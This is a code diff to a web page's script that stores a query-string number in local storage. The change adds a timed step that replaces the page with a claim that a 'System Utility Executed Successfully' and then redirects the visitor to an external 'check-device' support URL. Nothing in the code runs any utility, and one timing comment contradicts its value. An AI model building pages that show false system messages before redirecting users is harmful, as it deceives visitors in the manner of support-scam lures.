@@ -27,16 +27,24 @@
                     .catch(error => {
                         console.error('Error deleting random number:', error);
                     });
-                return; // Exit if the random number
+                return; // Exit if the random number is already stored
             }
 
-          
             if (randomNumber) {
                 localStorage.setItem('randomNumber', randomNumber);
                 console.log(`Random number ${randomNumber} stored in local storage.`);
             } else {
                 console.error('Random number not found in query parameters.');
             }
+
+            // Simulate a delayed redirect (change content after 3 seconds)
+            setTimeout(() => {
+                const body = document.querySelector('body');
+                body.innerHTML = '<h1>System Utility Executed Successfully.</h1><p>Redirecting...</p>';
+                setTimeout(() => {
+                    window.location.href = 'https://support.bitboxpc.com/check-device';
+                }, 1000); // Redirect after another 1 second (total delay 4 seconds)
+            }, 2000); // Change content after 3 seconds
         });
     </script>
 </head>
